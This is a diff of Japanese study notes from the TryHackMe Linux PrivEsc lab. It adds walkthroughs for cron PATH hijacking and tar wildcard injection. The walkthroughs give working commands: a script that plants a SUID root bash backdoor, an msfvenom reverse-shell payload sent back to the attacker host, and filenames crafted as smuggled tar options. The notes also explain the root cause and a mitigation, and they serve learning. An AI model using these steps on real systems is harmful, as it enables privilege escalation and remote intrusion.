@@ -2,7 +2,7 @@
 
 > **ルーム:** [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
 > **学習日:** 2026-05-24 〜
-> **進捗:** Task 1〜8 完了（38%）
+> **進捗:** Task 1〜10 完了（48%）
 > **初期認証情報:** `user:password321`（SSH接続可）
 
 ---
@@ -583,9 +583,181 @@ cat /usr/local/bin/overwrite.sh  # 空になったことを確認
 
 ---
 
+## Task 9: Cron Jobs - PATH Environment Variable
+
+### 概要
+
+`/etc/crontab` の `PATH` 変数の先頭に **一般ユーザーのホームディレクトリ** が設定されているミスを悪用する。  
+Cronが `overwrite.sh` をフルパスなしで実行するため、同名の偽スクリプトをホームディレクトリに置くだけでシステムを乗っ取れる。
+
+### 仕組み（PATHハイジャック）
+
+```
+/etc/crontab の設定:
+  PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:...
+               ↑
+         先頭が /home/user（一般ユーザーが書き込める場所）
+
+  * * * * * root overwrite.sh   ← フルパスなし！
+```
+
+Cronが `overwrite.sh` を探す際、PATH を先頭から順に検索する。`/home/user/overwrite.sh` が存在すれば、本来の `/usr/local/bin/overwrite.sh` より先に見つかり、root権限でそちらを実行してしまう。
+
+### 手順
+
+```bash
+# ターゲットマシン（user@debian）上で実行
+
+# 1. PATHとCronジョブを確認
+cat /etc/crontab
+# PATH=/home/user:/usr/local/sbin:...
+# * * * * * root overwrite.sh  ← フルパスなし
+
+# 2. 偽の overwrite.sh をホームディレクトリに作成
+nano ~/overwrite.sh
+```
+
+```bash
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+```bash
+# 3. 実行権限を付与
+chmod +x /home/user/overwrite.sh
+
+# 4. Cronが発動するまで最大1分待つ（自動でrootが偽スクリプトを実行）
+
+# 5. 作成されたSUIDバックドアでrootシェルを取得
+/tmp/rootbash -p
+# rootbash-4.1# → root権限取得成功
+```
+
+### クリーンアップ
+
+```bash
+# rootshell内で
+rm /tmp/rootbash
+exit
+
+# user@debian で
+rm /home/user/overwrite.sh
+```
+
+### Task 8との比較
+
+| 比較軸 | Task 8（ファイル権限） | Task 9（PATH変数） |
+|-------|---------------------|------------------|
+| 悪用する設定ミス | スクリプトが world-writable | PATHの先頭がユーザー制御下 |
+| 攻撃手法 | 既存スクリプトを書き換える | 同名の偽スクリプトを先に置く |
+| 元のスクリプト | 破壊される | 無傷のまま（置き換えでなく優先） |
+| ステルス性 | 低（既存ファイルが変更される） | 高（元ファイルは一切変わらない） |
+
+---
+
+## Task 10: Cron Jobs - Wildcards
+
+### 概要
+
+Cronのスクリプトが `tar` コマンドを **ワイルドカード（`*`）** 付きで実行していることを悪用する。  
+ワイルドカードがファイル名として展開される仕様を逆用し、ファイル名に `tar` のオプション文字列を偽装することでコード実行（リバースシェル）を引き起こす。
+
+### 攻撃フロー
+
+```
+【compress.sh の中身】
+  tar czf /tmp/backup.tar.gz *   ← * が致命的
+
+【シェルの展開】
+  * → /home/user 内の全ファイル名に置換
+  ↓
+  tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf shell.elf tools ...
+                               ↑
+                  ファイル名がtarオプションとして誤認される
+
+【結果】
+  tar がチェックポイント機能を発動し、
+  shell.elf を root 権限で実行 → AttackBox へリバースシェル接続
+```
+
+### 手順
+
+```bash
+# AttackBox 上で実行
+
+# 1. リバースシェルのELFバイナリを生成（LHOSTは必ず自分のAttackBoxのIP）
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=[AttackBoxのIP] LPORT=4444 -f elf -o shell.elf
+
+# 2. ターゲットへ転送
+scp shell.elf user@[ターゲットIP]:/home/user
+```
+
+```bash
+# ターゲットマシン（user@debian）上で実行
+
+# 3. 実行権限を付与
+chmod +x /home/user/shell.elf
+
+# 4. tar オプションに偽装したファイル名を作成（中身は空でいい）
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+```bash
+# AttackBox 上で実行
+
+# 5. リスナーを起動してCronの発動を待つ（最大1分）
+nc -nvlp 4444
+# → Connection received on [ターゲットIP]...
+#    （プロンプトが出なくても接続はできている）
+
+# 6. id コマンドで確認
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+### クリーンアップ
+
+```bash
+# netcat のシェル上で（ターゲットの /home/user/ から削除）
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm "/home/user/--checkpoint-action=exec=shell.elf"
+exit
+```
+
+### なぜワイルドカードが危険か（展開のタイミング）
+
+```
+管理者の意図:
+  tar czf backup.tar.gz *
+  → "全ファイルをバックアップ"
+
+シェルの実際の挙動:
+  1. * を展開して全ファイル名の文字列に置換
+  2. その文字列をそのまま tar の引数として渡す
+  3. tar は -- から始まる文字列を「オプション」と解釈する
+
+攻撃者が仕込めるもの:
+  --checkpoint=1            → 1ファイル処理ごとにチェックポイント
+  --checkpoint-action=exec= → チェックポイント時に指定コマンドを実行
+```
+
+シェルの展開が「コマンドに引数を渡す前」に行われる仕様が根本原因。ワイルドカードを使う場合は常に `--` で引数の終端を明示するか、ファイル名をクォートする必要がある。
+
+### 今回の失敗と学んだ教訓
+
+| ミス | 原因 | 教訓 |
+|-----|------|-----|
+| ペイロードが届かない | `LHOST=10.10.10.10`（ダミーIP）のままコピペ | リバースシェルはターゲットが自分のIPに通信する。LHOSTは必ず自分のAttackBox IPに変える |
+| プロンプトが出ないのに失敗と判断 | TTYなしのダムシェルはプロンプトを表示しない | 接続が来た後は `id` を打って root であることを確認する |
+
+---
+
 ## 次回の予定
 
-Task 9: Cron Jobs - PATH Environment Variable から再開
+Task 11: SUID / SGID Executables - Known Exploits から再開
 
 ---
 
